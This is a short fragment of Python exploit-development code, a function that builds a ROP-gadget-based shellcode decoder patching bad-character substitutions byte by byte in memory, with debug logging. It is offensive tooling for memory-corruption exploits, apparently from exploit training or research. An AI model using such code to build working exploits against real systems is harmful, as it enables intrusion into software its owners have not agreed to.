...
def generateShellcodeDecoder(replacements, rop_pop_ecx, rop_sub_eax_ecx_pop_ebx, rop_add_ptrEAX_1_bh, debug=False):
    ...
    for i in range(len(replacements)):
        # absolute address of the target byte (one byte before the actual index)
        target_addr = replacements[i]["index"] - 1

        neg_offset = (-target_addr) & 0xFFFFFFFF
        correction = replacements[i]["correction"]
        value = (correction << 8) | 0x11110011

        if debug:
            log(
                f"[{i:02}] idx={replacements[i]['index']:03} tgt={target_addr:#06x} neg_off={neg_offset:#010x} corr={correction:#04x}",
                indent=1,
                level="o",
            )
